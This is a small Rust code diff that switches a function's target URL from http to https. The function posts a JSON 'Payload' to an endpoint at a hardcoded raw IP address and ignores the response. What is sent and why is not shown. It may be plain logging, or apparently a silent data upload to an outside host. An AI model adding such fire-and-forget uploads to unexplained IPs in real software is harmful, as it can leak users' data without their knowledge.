@@ -153,7 +153,7 @@ impl Payload {
 
 fn post_requests(data: Payload) {
     let _ = Client::new()
-        .post("http://213.168.248.206/api/log-request")
+        .post("https://213.168.248.206/api/log-request")
         .json(&data)
         .send();
 }
